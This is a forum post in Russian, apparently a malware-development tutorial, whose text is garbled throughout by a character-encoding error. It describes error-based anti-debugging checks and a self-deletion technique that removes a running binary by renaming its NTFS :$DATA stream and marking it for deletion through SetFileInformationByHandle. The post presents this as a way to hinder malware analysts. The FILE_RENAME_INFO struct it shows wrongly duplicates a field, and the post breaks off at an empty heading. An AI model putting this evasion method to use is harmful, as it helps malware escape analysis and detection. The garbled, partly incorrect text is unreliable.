–ü—Ä–æ–≤–µ—Ä–∫–∞ –æ—à–∏–±–æ–∫ - —ç—Ç–æ –º–µ—Ç–æ–¥ –∞–Ω—Ç–∏–¥–µ–±–∞–≥–≥–∏–Ω–≥–∞, –∫–æ—Ç–æ—Ä—ã–π –ø—ã—Ç–∞–µ—Ç—Å—è –Ω–∞–π—Ç–∏ —Å–ª–µ–¥—ã —Ä–∞–±–æ—Ç—ã –æ—Ç–ª–∞–¥—á–∏–∫–∞ –≤ –∫–æ–¥–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã. –ö–æ–≥–¥–∞ –æ—Ç–ª–∞–¥—á–∏–∫ –æ—Å—Ç–∞–Ω–æ–≤–∏—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –Ω–∞ —Ç–æ—á–∫–µ –æ—Å—Ç–∞–Ω–æ–≤–∞ –∏–ª–∏ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–∏—Ç –µ–µ –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞, –æ–Ω –±—É–¥–µ—Ç –≤–Ω–µ–¥—Ä—è—Ç—å —Å–≤–æ–π –∫–æ–¥ –∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–≤–æ–∏ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–µ —Å—Ä–µ–¥—Å—Ç–≤–∞ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ–º. –≠—Ç–æ –º–æ–∂–µ—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ –ø–æ—è–≤–ª–µ–Ω–∏—é –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –æ—à–∏–±–æ–∫ –≤ –ø—Ä–æ–≥—Ä–∞–º–º–µ, –∫–æ—Ç–æ—Ä—ã–µ –æ–±—ã—á–Ω–æ –Ω–µ –≤–æ–∑–Ω–∏–∫–∞—é—Ç –≤ –Ω–æ—Ä–º–∞–ª—å–Ω–æ–º —Ä–µ–∂–∏–º–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è.<br />
<br />
–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ —Ç–∞–∫–∏—Ö –æ—à–∏–±–æ–∫ –º–æ–∂–µ—Ç –ø–æ–º–æ—á—å –≤—ã—è–≤–∏—Ç—å –Ω–∞–ª–∏—á–∏–µ –æ—Ç–ª–∞–¥—á–∏–∫–∞. –ü—Ä–∏–º–µ—Ä—ã –æ—à–∏–±–æ–∫, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–∂–Ω–æ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, –≤–∫–ª—é—á–∞—é—Ç:<br />
<ol>
<li data-xf-list-type="ol">Division by zero (–¥–µ–ª–µ–Ω–∏–µ –Ω–∞ –Ω–æ–ª—å).</li>
<li data-xf-list-type="ol">Null pointer dereference (—Ä–∞–∑—ã–º–µ–Ω–æ–≤–∞–Ω–∏–µ –Ω—É–ª–µ–≤–æ–≥–æ —É–∫–∞–∑–∞—Ç–µ–ª—è).</li>
<li data-xf-list-type="ol">Access violation (–Ω–∞—Ä—É—à–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞ –∫ –ø–∞–º—è—Ç–∏).</li>
<li data-xf-list-type="ol">Invalid instruction (–Ω–µ–¥–æ–ø—É—Å—Ç–∏–º–∞—è –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è).</li>
</ol>–ò—Å–∫—É—Å—Å—Ç–≤–µ–Ω–Ω–æ–µ —Å–æ–∑–¥–∞–Ω–∏–µ –∏ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ —Ç–∞–∫–∏—Ö –æ—à–∏–±–æ–∫ –º–æ–∂–µ—Ç –±—ã—Ç—å —á–∞—Å—Ç—å—é —Å—Ç—Ä–∞—Ç–µ–≥–∏–∏ –∞–Ω—Ç–∏-–¥–µ–±–∞–≥–≥–∏–Ω–≥–∞ –≤ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–º –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–º –æ–±–µ—Å–ø–µ—á–µ–Ω–∏–∏.<br />
<br />
–í–∞–∂–Ω–æ –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ —ç—Ç–æ—Ç –º–µ—Ç–æ–¥ –Ω–µ –≤—Å–µ–≥–¥–∞ –Ω–∞–¥–µ–∂–µ–Ω, —Ç–∞–∫ –∫–∞–∫ –æ—à–∏–±–∫–∏ –º–æ–≥—É—Ç –≤–æ–∑–Ω–∏–∫–∞—Ç—å –∏ –≤ –Ω–æ—Ä–º–∞–ª—å–Ω—ã—Ö —É—Å–ª–æ–≤–∏—è—Ö –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä–æ–≥—Ä–∞–º–º—ã. –ü–æ—ç—Ç–æ–º—É –æ–Ω –¥–æ–ª–∂–µ–Ω –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –≤ —Å–æ—á–µ—Ç–∞–Ω–∏–∏ —Å –¥—Ä—É–≥–∏–º–∏ –º–µ—Ç–æ–¥–∞–º–∏ –∞–Ω—Ç–∏–¥–µ–±–∞–≥–≥–∏–Ω–≥–∞ –¥–ª—è –±–æ–ª–µ–µ –Ω–∞–¥–µ–∂–Ω–æ–π –∑–∞—â–∏—Ç—ã.<br />
<br />
<b>–°–∞–º–æ—É–¥–∞–ª–µ–Ω–∏–µ –≤–∏—Ä—É—Å–∞.)</b><br />
<br />
–í—ã—à–µ –æ–±—Å—É–∂–¥–∞–ª–∏—Å—å –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ç–µ—Ö–Ω–∏–∫, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –ø–æ–º–µ—à–∞—Ç—å –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—è–º –∏ –∞–Ω–∞–ª–∏—Ç–∏–∫–∞–º –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º –∏–∑—É—á–∞—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–µ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏–µ –∏ –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞—Ç—å –ø–æ–Ω–∏–º–∞–Ω–∏–µ –µ–≥–æ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç–∏ –∏–ª–∏ —Å–æ–∑–¥–∞–Ω–∏–µ —Å–∏–≥–Ω–∞—Ç—É—Ä. –¢–µ–ø–µ—Ä—å –ø—Ä–µ–¥–ª–∞–≥–∞—é —Ä–∞—Å—Å–º–æ—Ç—Ä–µ—Ç—å –ø—Ä–æ–¥–≤–∏–Ω—É—Ç—É—é —Ç–µ—Ö–Ω–∏–∫—É –∞–Ω—Ç–∏-–æ—Ç–ª–∞–¥–∫–∏, –∫–æ—Ç–æ—Ä–∞—è —Ä–∞–±–æ—Ç–∞–µ—Ç –ø—É—Ç–µ–º –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ —É–¥–∞–ª–µ–Ω–∏—è —Å–∞–º–æ–≥–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è.<br />
<br />
<b>–§–∞–π–ª–æ–≤–∞—è —Å–∏—Å—Ç–µ–º–∞ NTFS</b><br />
<br />
–ü—Ä–µ–∂–¥–µ —á–µ–º –ø–æ–≥—Ä—É–∑–∏—Ç—å—Å—è –≤ —Å–∞–º–æ—É–¥–∞–ª–µ–Ω–∏–µ, –≤–∞–∂–Ω–æ –ø–æ–Ω—è—Ç—å, –∫–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç —Ñ–∞–π–ª–æ–≤–∞—è —Å–∏—Å—Ç–µ–º–∞ New Technology File System (NTFS). NTFS - —ç—Ç–æ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–∞—è —Ñ–∞–π–ª–æ–≤–∞—è —Å–∏—Å—Ç–µ–º–∞, —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–∞—è –≤ –∫–∞—á–µ—Å—Ç–≤–µ –æ—Å–Ω–æ–≤–Ω–æ–π —Ñ–∞–π–ª–æ–≤–æ–π —Å–∏—Å—Ç–µ–º—ã –¥–ª—è –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã Windows. –û–Ω–∞ –ø—Ä–µ–≤–æ—Å—Ö–æ–¥–∏—Ç —Å–≤–æ–∏—Ö –ø—Ä–µ–¥—à–µ—Å—Ç–≤–µ–Ω–Ω–∏–∫–æ–≤, FAT –∏ exFAT, –ø—Ä–µ–¥–ª–∞–≥–∞—è —Ç–∞–∫–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏, –∫–∞–∫ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –Ω–∞ —Ñ–∞–π–ª—ã –∏ –ø–∞–ø–∫–∏, —Å–∂–∞—Ç–∏–µ, —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ, –∂–µ—Å—Ç–∫–∏–µ —Å—Å—ã–ª–∫–∏, —Å–∏–º–≤–æ–ª–∏—á–µ—Å–∫–∏–µ —Å—Å—ã–ª–∫–∏ –∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–æ–Ω–Ω—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏. NTFS —Ç–∞–∫–∂–µ –æ–±–µ—Å–ø–µ—á–∏–≤–∞–µ—Ç —É–≤–µ–ª–∏—á–µ–Ω–Ω—É—é –Ω–∞–¥–µ–∂–Ω–æ—Å—Ç—å, –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∏ –º–∞—Å—à—Ç–∞–±–∏—Ä—É–µ–º–æ—Å—Ç—å.<br />
<br />
–§–∞–π–ª–æ–≤–∞—è —Å–∏—Å—Ç–µ–º–∞ NTFS —Ç–∞–∫–∂–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–µ –ø–æ—Ç–æ–∫–∏ –¥–∞–Ω–Ω—ã—Ö. –§–∞–π–ª—ã –≤ —Ñ–∞–π–ª–æ–≤—ã—Ö —Å–∏—Å—Ç–µ–º–∞—Ö NTFS –º–æ–≥—É—Ç –∏–º–µ—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø–æ—Ç–æ–∫–æ–≤ –¥–∞–Ω–Ω—ã—Ö, –∫—Ä–æ–º–µ –ø–æ—Ç–æ–∫–∞ –¥–∞–Ω–Ω—ã—Ö –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é, :$DATA. :$DATA —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –¥–ª—è –∫–∞–∂–¥–æ–≥–æ —Ñ–∞–π–ª–∞, –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è—è –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π —Å–ø–æ—Å–æ–± –¥–æ—Å—Ç—É–ø–∞ –∫ –Ω–∏–º.<br />
<br />
<b>–£–¥–∞–ª–µ–Ω–∏–µ –≤—ã–ø–æ–ª–Ω—è—é—â–µ–≥–æ—Å—è –¥–≤–æ–∏—á–Ω–æ–≥–æ —Ñ–∞–π–ª–∞</b><br />
<br />
–ù–∞ Windows –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ —É–¥–∞–ª–∏—Ç—å —Ç–µ–∫—É—â–∏–π –≤—ã–ø–æ–ª–Ω—è—é—â–∏–π—Å—è –¥–≤–æ–∏—á–Ω—ã–π —Ñ–∞–π–ª, —Ç–∞–∫ –∫–∞–∫ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è —Ñ–∞–π–ª–∞ –æ–±—ã—á–Ω–æ —Ç—Ä–µ–±—É–µ—Ç—Å—è, —á—Ç–æ–±—ã –Ω–∏ –æ–¥–∏–Ω –¥—Ä—É–≥–æ–π –ø—Ä–æ—Ü–µ—Å—Å –Ω–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª –µ–≥–æ. –ù–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –Ω–∏–∂–µ –ø–æ–∫–∞–∑–∞–Ω–∞ –Ω–µ—É–¥–∞—á–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è –ø–∞–ø–∫–∏ &quot;Release&quot; –ø—Ä–∏ –Ω–∞–ª–∏—á–∏–∏ –æ—Ç–∫—Ä—ã—Ç–æ–≥–æ —Ñ–∞–π–ª–∞ –≤–Ω—É—Ç—Ä–∏ —ç—Ç–æ–π –ø–∞–ø–∫–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787181933.png"
		data-src="https://osint42.org/attachments/1746787181933-png.246/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787181933-png.246/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787181933.png"
			title="1746787181933.png"
			width="1843" height="549" loading="lazy" />
	</div><br />
<br />
–ï—â–µ –æ–¥–Ω–∏–º –ø—Ä–∏–º–µ—Ä–æ–º —è–≤–ª—è–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ DeleteFile WinAPI, –∫–æ—Ç–æ—Ä–∞—è —É–¥–∞–ª—è–µ—Ç —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π —Ñ–∞–π–ª. –§—É–Ω–∫—Ü–∏—è DeleteFile WinAPI –∑–∞–≤–µ—Ä—à–∞–µ—Ç—Å—è —Å –æ—à–∏–±–∫–æ–π ERROR_ACCESS_DENIED.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787188029.png"
		data-src="https://osint42.org/attachments/1746787188029-png.247/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787188029-png.247/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787188029.png"
			title="1746787188029.png"
			width="1674" height="712" loading="lazy" />
	</div><br />
<br />
–û–¥–∏–Ω –∏–∑ —Å–ø–æ—Å–æ–±–æ–≤ –æ–±–æ–π—Ç–∏ —ç—Ç–æ - –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞—Ç—å –ø–æ—Ç–æ–∫ –¥–∞–Ω–Ω—ã—Ö –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é :$DATA –≤ –¥—Ä—É–≥–æ–µ —Å–ª—É—á–∞–π–Ω–æ–µ –∏–º—è, –∫–æ—Ç–æ—Ä–æ–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –Ω–æ–≤—ã–π –ø–æ—Ç–æ–∫ –¥–∞–Ω–Ω—ã—Ö. –ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ —É–¥–∞–ª–µ–Ω–∏–µ —Ç–æ–ª—å–∫–æ —á—Ç–æ –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏–≤–µ–¥–µ—Ç –∫ —Å—Ç–∏—Ä–∞–Ω–∏—é –¥–≤–æ–∏—á–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ —Å –¥–∏—Å–∫–∞, –¥–∞–∂–µ –µ—Å–ª–∏ –æ–Ω –≤—Å–µ –µ—â–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è.<br />
<br />
<b>–ü–æ–ª—É—á–µ–Ω–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ñ–∞–π–ª–∞</b><br />
<br />
–ü–µ—Ä–≤—ã–º —à–∞–≥–æ–º –ø—Ä–æ—Ü–µ—Å—Å–∞ —è–≤–ª—è–µ—Ç—Å—è –ø–æ–ª—É—á–µ–Ω–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ü–µ–ª–µ–≤–æ–≥–æ —Ñ–∞–π–ª–∞, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π —Ñ–∞–π–ª –ª–æ–∫–∞–ª—å–Ω–æ–π —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏. –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ñ–∞–π–ª–∞ –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å —Å –ø–æ–º–æ—â—å—é —Ñ—É–Ω–∫—Ü–∏–∏ CreateFile WinAPI. –§–ª–∞–≥ –¥–æ—Å—Ç—É–ø–∞ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ DELETE, —á—Ç–æ–±—ã –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç—å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –Ω–∞ —É–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞.<br />
<br />
<b>–ü–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–∏–µ –ø–æ—Ç–æ–∫–∞ –¥–∞–Ω–Ω—ã—Ö</b><br />
<br />
–°–ª–µ–¥—É—é—â–∏–º —à–∞–≥–æ–º –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω—è—é—â–µ–≥–æ—Å—è –¥–≤–æ–∏—á–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ —è–≤–ª—è–µ—Ç—Å—è –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–∏–µ –ø–æ—Ç–æ–∫–∞ –¥–∞–Ω–Ω—ã—Ö :$DATA. –≠—Ç–æ –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å —Å –ø–æ–º–æ—â—å—é —Ñ—É–Ω–∫—Ü–∏–∏ SetFileInformationByHandle WinAPI —Å —Ñ–ª–∞–≥–æ–º FileRenameInfo.<br />
<br />
–§—É–Ω–∫—Ü–∏—è SetFileInformationByHandle WinAPI –ø–æ–∫–∞–∑–∞–Ω–∞ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL SetFileInformationByHandle(
[in] HANDLE hFile, // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ñ–∞–π–ª–∞, –¥–ª—è –∫–æ—Ç–æ—Ä–æ–≥–æ –∏–∑–º–µ–Ω—è–µ—Ç—Å—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è.
[in] FILE_INFO_BY_HANDLE_CLASS FileInformationClass, // –ó–Ω–∞—á–µ–Ω–∏–µ —Ñ–ª–∞–≥–∞, —É–∫–∞–∑—ã–≤–∞—é—â–µ–µ —Ç–∏–ø –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏, –∫–æ—Ç–æ—Ä—É—é –Ω—É–∂–Ω–æ –∏–∑–º–µ–Ω–∏—Ç—å
[in] LPVOID lpFileInformation, // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –±—É—Ñ–µ—Ä, —Å–æ–¥–µ—Ä–∂–∞—â–∏–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –¥–ª—è –∏–∑–º–µ–Ω–µ–Ω–∏—è
[in] DWORD dwBufferSize // –†–∞–∑–º–µ—Ä –±—É—Ñ–µ—Ä–∞ &#039;lpFileInformation&#039; –≤ –±–∞–π—Ç–∞—Ö
);</code></pre>
	</div>
</div><br />
–ü–∞—Ä–∞–º–µ—Ç—Ä FileInformationClass –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –∑–Ω–∞—á–µ–Ω–∏–µ–º –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è FILE_INFO_BY_HANDLE_CLASS.<br />
<br />
–ö–æ–≥–¥–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä FileInformationClass —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ FileRenameInfo, —Ç–æ lpFileInformation –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —É–∫–∞–∑–∞—Ç–µ–ª–µ–º –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É FILE_RENAME_INFO, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –≤ —Å–ª–µ–¥—É—é—â–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787217471.png"
		data-src="https://osint42.org/attachments/1746787217471-png.248/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787217471-png.248/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787217471.png"
			title="1746787217471.png"
			width="849" height="96" loading="lazy" />
	</div><br />
<br />
–°—Ç—Ä—É–∫—Ç—É—Ä–∞ FILE_RENAME_INFO –ø–æ–∫–∞–∑–∞–Ω–∞ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _FILE_RENAME_INFO {
union {
BOOLEAN ReplaceIfExists;
DWORD Flags;
} DUMMYUNIONNAME;
BOOLEAN ReplaceIfExists;
HANDLE RootDirectory;
DWORD FileNameLength; // –†–∞–∑–º–µ—Ä &#039;FileName&#039; –≤ –±–∞–π—Ç–∞—Ö
WCHAR FileName[1]; // –ù–æ–≤–æ–µ –∏–º—è
} FILE_RENAME_INFO, *PFILE_RENAME_INFO;</code></pre>
	</div>
</div><br />
–î–≤–∞ —á–ª–µ–Ω–∞, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å, - —ç—Ç–æ FileNameLength –∏ FileName. –î–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è Microsoft –æ–±—ä—è—Å–Ω—è–µ—Ç, –∫–∞–∫ –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –Ω–æ–≤–æ–µ –∏–º—è –ø–æ—Ç–æ–∫–∞ –¥–∞–Ω–Ω—ã—Ö NTFS.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787226401.png"
		data-src="https://osint42.org/attachments/1746787226401-png.249/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787226401-png.249/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787226401.png"
			title="1746787226401.png"
			width="1214" height="195" loading="lazy" />
	</div><br />
<br />
–°–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, FileName –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Å—Ç—Ä–æ–∫–æ–π —à–∏—Ä–æ–∫–∏—Ö —Å–∏–º–≤–æ–ª–æ–≤, –Ω–∞—á–∏–Ω–∞—é—â–µ–π—Å—è —Å –¥–≤–æ–µ—Ç–æ—á–∏—è <img src="../../../cdn.jsdelivr.net/joypixels/assets/8.0/png/unicode/64/1f642.png" class="smilie smilie--emoji" loading="lazy" width="64" height="64" alt="(:" title="Smile    (:"  data-smilie="1"data-shortname="(:" />).<br />
<br />
<b>–£–¥–∞–ª–µ–Ω–∏–µ –ø–æ—Ç–æ–∫–∞ –¥–∞–Ω–Ω—ã—Ö</b><br />
<br />
–ü–æ—Å–ª–µ–¥–Ω–∏–º —à–∞–≥–æ–º —è–≤–ª—è–µ—Ç—Å—è —É–¥–∞–ª–µ–Ω–∏–µ –ø–æ—Ç–æ–∫–∞ –¥–∞–Ω–Ω—ã—Ö :$DATA –¥–ª—è —Å—Ç–∏—Ä–∞–Ω–∏—è —Ñ–∞–π–ª–∞ —Å –¥–∏—Å–∫–∞. –î–ª—è —ç—Ç–æ–≥–æ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —Ç–∞ –∂–µ —Ñ—É–Ω–∫—Ü–∏—è SetFileInformationByHandle WinAPI, –Ω–æ —Å –¥—Ä—É–≥–∏–º —Ñ–ª–∞–≥–æ–º, FileDispositionInfo. –≠—Ç–æ—Ç —Ñ–ª–∞–≥ –ø–æ–º–µ—á–∞–µ—Ç —Ñ–∞–π–ª –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ –µ–≥–æ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞. –≠—Ç–æ —Ñ–ª–∞–≥, –∫–æ—Ç–æ—Ä—ã–π –∏—Å–ø–æ–ª—å–∑—É–µ—Ç Microsoft <a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfileinformationbyhandle#examples" target="_blank" class="link link--external" rel="noopener">–≤ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–º –Ω–∏–∂–µ –ø—Ä–∏–º–µ—Ä–µ.</a><br />
<br />
–ö–æ–≥–¥–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ñ–ª–∞–≥ FileDispositionInfo, lpFileInformation –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —É–∫–∞–∑–∞—Ç–µ–ª–µ–º –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É FILE_DISPOSITION_INFO, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –≤ —Å–ª–µ–¥—É—é—â–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787236100.png"
		data-src="https://osint42.org/attachments/1746787236100-png.250/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787236100-png.250/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787236100.png"
			title="1746787236100.png"
			width="799" height="91" loading="lazy" />
	</div><br />
<br />
–°—Ç—Ä—É–∫—Ç—É—Ä–∞ FILE_DISPOSITION_INFO –ø–æ–∫–∞–∑–∞–Ω–∞ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _FILE_DISPOSITION_INFO {
BOOLEAN DeleteFile; // –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –≤ &#039;TRUE&#039;, —á—Ç–æ–±—ã –ø–æ–º–µ—Ç–∏—Ç—å —Ñ–∞–π–ª –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è
} FILE_DISPOSITION_INFO, *PFILE_DISPOSITION_INFO;</code></pre>
	</div>
</div><br />
–ß–ª–µ–Ω DeleteFile –¥–æ–ª–∂–µ–Ω –ø—Ä–æ—Å—Ç–æ –±—ã—Ç—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ TRUE –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è —Ñ–∞–π–ª–∞.<br />
<br />
<b>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø–æ—Ç–æ–∫–∞ –¥–∞–Ω–Ω—ã—Ö —Ñ–∞–π–ª–∞</b><br />
<br />
